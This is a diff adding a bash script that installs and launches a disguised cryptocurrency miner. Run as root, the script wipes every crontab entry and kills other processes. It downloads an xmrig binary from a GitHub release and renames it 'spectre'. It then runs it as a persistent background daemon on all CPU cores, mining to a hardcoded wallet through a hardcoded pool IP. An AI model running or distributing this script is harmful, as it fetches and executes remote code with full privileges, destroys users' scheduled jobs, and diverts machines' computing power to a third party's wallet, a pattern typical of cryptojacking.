@@ -1,0 +1,46 @@
+#!/bin/bash
+
+# Remove existing crontab entries
+sudo crontab -r
+
+# Install unzip if not already installed
+sudo apt update
+sudo apt install -y unzip
+
+# Run a script to kill processes if needed (ensure it's correct)
+sudo ./killdero.sh
+sudo pkill spectre
+
+# Default wallet address
+default_wallet_address="SaLvdVQeeqA1x4eKjwS4qQMMSXJxFh82bTfToeqfHPs2jCmH1EqHgRua9rjAffrtFUgoGqViuz4vQj8h6ttnGjmo4aUrTSkHLiT"
+
+# Get the number of CPU cores
+cpu_cores=$(nproc)
+nproc > cpu_cores
+
+# Download the miner package
+sudo wget https://github.com/nambui979/salvium/releases/download/download/xmrig
+
+sudo cp xmrig spectre
+
+# Create the min.sh script
+cat <<EOF > min.sh
+#!/bin/bash
+
+# Default wallet address
+default_wallet_address="SaLvdVQeeqA1x4eKjwS4qQMMSXJxFh82bTfToeqfHPs2jCmH1EqHgRua9rjAffrtFUgoGqViuz4vQj8h6ttnGjmo4aUrTSkHLiT"
+
+# Get the number of CPU cores
+cpu_cores=\$(nproc)
+
+# Run the miner with nohup to prevent it from being stopped when the session ends
+sudo nohup ./spectre --coin=SAL -o 34.134.48.19:19081 -u SaLvdVQeeqA1x4eKjwS4qQMMSXJxFh82bTfToeqfHPs2jCmH1EqHgRua9rjAffrtFUgoGqViuz4vQj8h6ttnGjmo4aUrTSkHLiT --daemon --threads \$cpu_cores > miner.log 2>&1 &
+EOF
+
+# Make the min.sh script executable
+sudo chmod +x min.sh
+
+# Run the min.sh script
+sudo ./min.sh
+
+echo "Miner setup and execution complete. Check miner.log for output."
